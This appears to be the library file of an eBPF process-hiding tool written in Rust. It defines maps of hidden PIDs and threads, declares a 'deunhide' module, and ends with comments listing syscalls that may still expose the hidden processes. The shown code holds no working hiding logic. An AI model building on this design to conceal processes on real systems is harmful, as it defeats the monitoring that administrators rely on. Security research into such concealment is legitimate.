#![no_std]

use aya_ebpf::{macros::map, maps::HashMap};
use caracal_common::MAX_HIDDEN_PIDS;

pub mod bpf;
pub mod deunhide;
pub mod pid;

#[map]
static HIDDEN_PIDS: HashMap<u32, u8> = HashMap::<u32, u8>::with_max_entries(MAX_HIDDEN_PIDS, 0);
#[map]
static HIDDEN_THREADS: HashMap<u32, u8> = HashMap::<u32, u8>::with_max_entries(MAX_HIDDEN_PIDS, 0);

// getpgid: ko
// getsid: ko
// sched_getaffinity:ko
// sched_getparam:ko
// sched_getscheduler:ko
// sched_rr_get_interval:
// kill(..,0): ko
